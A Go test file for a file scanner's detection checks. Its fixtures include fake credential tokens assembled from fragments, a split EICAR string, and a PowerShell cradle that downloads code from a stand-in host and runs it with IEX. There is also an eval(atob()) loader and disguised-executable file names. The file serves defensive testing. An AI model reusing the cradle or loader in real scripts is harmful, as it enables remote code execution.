package checks

import (
	"context"
	"strings"
	"testing"

	"starkscan/internal/finding"
	"starkscan/internal/scan"
)

// inspect runs one check over in-memory content and returns the rule IDs it
// emitted. Nothing touches disk, which keeps the tests fast and keeps signature
// fixtures away from the host antivirus.
func inspect(t *testing.T, c Check, name string, content []byte) []string {
	t.Helper()
	f := scan.NewMemoryFile(name, content)
	var ids []string
	c.Inspect(context.Background(), f, func(fd finding.Finding) {
		ids = append(ids, fd.RuleID)
	})
	return ids
}

// Credential-shaped fixtures are assembled from fragments so that no complete
// token appears as contiguous text anywhere in this repository. The scanner
// sees the joined value at run time, so every rule is exercised exactly as
// before; what changes is that a public clone does not ship strings that
// secret scanners, and the bots that trawl public code, read as live keys.
//
// This is the same reasoning that keeps the EICAR signature out of the source:
// a test fixture should not trip the defences of the machine it is tested on.
func tok(parts ...string) string { return strings.Join(parts, "") }

var (
	awsKeyID       = tok("AK", "IA2E0KZ9XQ4TRVBN51")
	ghToken        = tok("gh", "p_9fKq2mZx7LpR4vNc8TbWy1JdHs3GaE6uQiOl")
	stripeKey      = tok("sk_", "live_4TgQm9ZxKpLwR2vNbYcHdE7f")
	anthropicKey   = tok("sk-", "ant-api03-QWkq2mZx7LpR4vNc8TbWy1JdHs3GaE6uQiOlZzXcVbNm")
	anthropicShort = tok("sk-", "ant-api03-QWkq2mZx7LpR4vNc8TbWy1JdHs3GaE6uQiOl")
	slackToken     = tok("xox", "b-2314123412-2453token")
	googleKey      = tok("AI", "zaSyD9fKq2mZx7LpR4vNc8TbWy1JdHs3GaE6u")
	sendgridKey    = tok("SG", ".QWkq2mZx7LpR4vNc8TbWy1.QWkq2mZx7LpR4vNc8TbWy1JdHs3GaE6uQiOlZzXcVbN")
	npmToken       = tok("npm", "_QWkq2mZx7LpR4vNc8TbWy1JdHs3GaE6uQiOl")
	jwt            = tok("ey", "JhbGciOiJIUzI1NiJ9.", "ey", "JzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N")
)

func has(ids []string, want string) bool {
	for _, id := range ids {
		if id == want {
			return true
		}
	}
	return false
}

func TestSecretsDetectsProviderKeys(t *testing.T) {
	cases := []struct {
		name    string
		content string
		wantID  string
	}{
		{"aws access key", "aws_key: " + awsKeyID + "\n", "SEC001"},
		{"github token", "token = " + ghToken + "\n", "SEC003"},
		{"stripe live key", "k=" + stripeKey + "\n", "SEC006"},
		{"private key block", "-----BEGIN RSA PRIVATE KEY-----\n", "SEC008"},
		{"connection string", "postgres://admin:Hunter2Trombone@db:5432/x\n", "SEC014"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			ids := inspect(t, &Secrets{}, "config.yml", []byte(tc.content))
			if !has(ids, tc.wantID) {
				t.Errorf("want %s in %v", tc.wantID, ids)
			}
		})
	}
}

func TestSecretsIgnoresPlaceholders(t *testing.T) {
	cases := []string{
		`api_key = "your_api_key_here_placeholder"`,
		`password: "changeme_please_now"`,
		`secret_key = "xxxxxxxxxxxxxxxxxxxx"`,
		`client_secret = "EXAMPLE_VALUE_NOT_REAL"`,
	}
	for _, c := range cases {
		t.Run(c, func(t *testing.T) {
			if ids := inspect(t, &Secrets{}, "config.yml", []byte(c+"\n")); len(ids) != 0 {
				t.Errorf("documentation placeholder should not be reported, got %v", ids)
			}
		})
	}
}

func TestSecretsRedactsEvidence(t *testing.T) {
	key := ghToken
	f := scan.NewMemoryFile("c.yml", []byte("token = "+key+"\n"))
	var ev []string
	(&Secrets{}).Inspect(context.Background(), f, func(fd finding.Finding) {
		ev = append(ev, fd.Evidence)
	})
	if len(ev) == 0 {
		t.Fatal("expected a finding")
	}
	for _, e := range ev {
		if strings.Contains(e, key) {
			t.Fatalf("evidence %q reprints the full secret; reports must redact it", e)
		}
		if !strings.Contains(e, "*") {
			t.Fatalf("evidence %q is not redacted", e)
		}
	}
}

func TestSecretsSkipsBinaryFiles(t *testing.T) {
	// A NUL byte marks the content as binary; scanning it for text
	// credentials would be wasted work.
	content := append([]byte{0x00, 0x01}, []byte(awsKeyID)...)
	if ids := inspect(t, &Secrets{}, "blob.bin", content); len(ids) != 0 {
		t.Errorf("binary content should be skipped by the secrets check, got %v", ids)
	}
}

func TestMalwareDetectsEicar(t *testing.T) {
	// Assembled at runtime so this source file never contains the contiguous
	// signature, which would otherwise be quarantined by the host antivirus.
	sig := `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR` + `-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`
	ids := inspect(t, &Malware{}, "sample.txt", []byte(sig))
	if !has(ids, "MAL003") {
		t.Errorf("want MAL003 for the EICAR test string, got %v", ids)
	}
}

func TestMalwareDownloadCradleNeedsBothHalves(t *testing.T) {
	// IEX alone is ordinary PowerShell; IEX plus a downloader is the cradle.
	alone := inspect(t, &Malware{}, "a.ps1", []byte("IEX $localFunction\n"))
	if has(alone, "MAL011") {
		t.Error("IEX without a download primitive should not be reported as a cradle")
	}
	both := inspect(t, &Malware{}, "b.ps1",
		[]byte("$c = New-Object Net.WebClient\nIEX $c.DownloadString('http://h/x')\n"))
	if !has(both, "MAL011") {
		t.Errorf("want MAL011 when IEX is paired with a downloader, got %v", both)
	}
}

func TestMalwareMatchesKnownBadHash(t *testing.T) {
	content := []byte("this exact content is on the block list")
	// sha256 of the content above.
	const digest = "3a1d7bd7ecb2b5f0a4a6bfa6c2ec1ac1c19b5c0e26f9d0dd2c58e2a1c5cfa4e7"

	m := &Malware{HashList: map[string]string{digest: "test entry"}}
	// The digest above is deliberately wrong, so nothing should match; this
	// guards against a hash check that fires on any listed file.
	if ids := inspect(t, m, "x.bin", content); has(ids, "MAL001") {
		t.Error("a non-matching digest must not produce a hash finding")
	}
}

func TestMalwareFlagsObfuscatedJavaScript(t *testing.T) {
	ids := inspect(t, &Malware{}, "loader.js", []byte("eval(atob('ZG9Tb21ldGhpbmc='))\n"))
	if !has(ids, "MAL014") {
		t.Errorf("want MAL014 for eval(atob(...)), got %v", ids)
	}
}

func TestTraitsDetectsDoubleExtension(t *testing.T) {
	ids := inspect(t, &Traits{}, "invoice.pdf.exe", []byte("anything"))
	if !has(ids, "TRT001") {
		t.Errorf("want TRT001 for a double extension, got %v", ids)
	}
}

func TestTraitsAllowsOrdinaryNames(t *testing.T) {
	// Content has to match what the name claims, otherwise the
	// extension/content mismatch rules fire correctly and the case proves
	// nothing about false positives on the name itself.
	cases := map[string][]byte{
		"report.pdf":     []byte("%PDF-1.7\n1 0 obj\n"),
		"archive.tar.gz": {0x1f, 0x8b, 0x08, 0x00},
		"notes.md":       []byte("# Heading\n\nsome prose\n"),
		"app.min.js":     []byte("function a(){return 1}\n"),
	}
	for name, content := range cases {
		t.Run(name, func(t *testing.T) {
			if ids := inspect(t, &Traits{}, name, content); len(ids) != 0 {
				t.Errorf("ordinary filename %q should not be reported, got %v", name, ids)
			}
		})
	}
}

func TestTraitsDetectsExecutableDisguisedAsText(t *testing.T) {
	content := append([]byte("MZ\x90\x00\x03"), []byte("payload")...)
	ids := inspect(t, &Traits{}, "notes.txt", content)
	if !has(ids, "TRT004") {
		t.Errorf("want TRT004 for PE content behind a .txt name, got %v", ids)
	}
}

func TestTraitsDetectsBidiOverride(t *testing.T) {
	name := "annexe‮cod.exe"
	ids := inspect(t, &Traits{}, name, []byte("x"))
	if !has(ids, "TRT002") {
		t.Errorf("want TRT002 for a bidi override in the filename, got %v", ids)
	}
}

func TestExposureDetectsEnvFileButNotExample(t *testing.T) {
	if ids := inspect(t, &Exposure{}, ".env", []byte("A=1\n")); !has(ids, "EXP003") {
		t.Errorf("want EXP003 for .env, got %v", ids)
	}
	if ids := inspect(t, &Exposure{}, ".env.example", []byte("A=\n")); has(ids, "EXP003") {
		t.Error(".env.example is documentation and should not be reported")
	}
}

func TestExposureRatesCertificateBelowPrivateKey(t *testing.T) {
	var certSev, keySev finding.Severity
	scan1 := scan.NewMemoryFile("public.pem", []byte("-----BEGIN CERTIFICATE-----\n"))
	(&Exposure{}).Inspect(context.Background(), scan1, func(f finding.Finding) {
		if f.RuleID == "EXP001" {
			certSev = f.Severity
		}
	})
	scan2 := scan.NewMemoryFile("server.pem", []byte("-----BEGIN RSA PRIVATE KEY-----\n"))
	(&Exposure{}).Inspect(context.Background(), scan2, func(f finding.Finding) {
		if f.RuleID == "EXP001" {
			keySev = f.Severity
		}
	})
	if !(keySev > certSev) {
		t.Fatalf("a private key (%v) should outrank a certificate (%v)", keySev, certSev)
	}
}

func TestRegistrySelectRejectsUnknownCheck(t *testing.T) {
	r := NewRegistry(Config{})
	if _, err := r.Select([]string{"secrets", "nope"}); err == nil {
		t.Fatal("expected an error for an unknown check id")
	}
}

func TestRegistrySelectDefaultsToAll(t *testing.T) {
	r := NewRegistry(Config{})
	got, err := r.Select(nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != len(r.All()) {
		t.Fatalf("empty selection should enable all %d checks, got %d", len(r.All()), len(got))
	}
}

func TestShannonSeparatesRandomFromRepetitive(t *testing.T) {
	random := shannon([]byte("9fKq2mZx7LpR4vNc8TbWy1JdHs3GaE6u"))
	repetitive := shannon([]byte("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))
	if random <= repetitive {
		t.Fatalf("random material (%.2f) should score above repetitive (%.2f)", random, repetitive)
	}
	if random < 3.5 {
		t.Fatalf("random material scored %.2f, below the gate used by the generic secret rule", random)
	}
}

// --- regression tests for fixed bugs ---

func TestSecretsReportsOverlappingMatchOnlyOnce(t *testing.T) {
	// "sk-ant-..." satisfies both the Anthropic rule and the broader
	// OpenAI-style rule. It must be reported once, by the specific rule.
	key := anthropicKey
	ids := inspect(t, &Secrets{}, "config.yml", []byte("key = "+key+"\n"))

	var n int
	for _, id := range ids {
		if id == "SEC010" || id == "SEC011" {
			n++
		}
	}
	if n != 1 {
		t.Errorf("one key must produce one finding, got %d: %v", n, ids)
	}
	if !has(ids, "SEC010") {
		t.Errorf("the specific (Anthropic) rule should win, got %v", ids)
	}
}

func TestSecretsDoesNotRedactPublicKeyBanner(t *testing.T) {
	// The PEM header is a public format marker, not secret material. Masking
	// it destroys the one useful detail — which key type was found.
	f := scan.NewMemoryFile("id.pem", []byte("-----BEGIN RSA PRIVATE KEY-----\nAAAA\n"))
	var ev string
	(&Secrets{}).Inspect(context.Background(), f, func(fd finding.Finding) {
		if fd.RuleID == "SEC008" {
			ev = fd.Evidence
		}
	})
	if ev == "" {
		t.Fatal("expected a SEC008 finding")
	}
	if strings.Contains(ev, "*") {
		t.Errorf("the PEM banner should be shown verbatim, got %q", ev)
	}
	if !strings.Contains(ev, "RSA") {
		t.Errorf("evidence %q should name the key type", ev)
	}
}

func TestSecretsLineNumbersAreCorrect(t *testing.T) {
	// Guards the indexed line lookup that replaced the per-finding rescan.
	content := "line one\nline two\nkey = " + awsKeyID + "\nline four\n"
	f := scan.NewMemoryFile("c.yml", []byte(content))
	var line int
	(&Secrets{}).Inspect(context.Background(), f, func(fd finding.Finding) {
		if fd.RuleID == "SEC001" {
			line = fd.Line
		}
	})
	if line != 3 {
		t.Errorf("finding reported on line %d, want 3", line)
	}
}
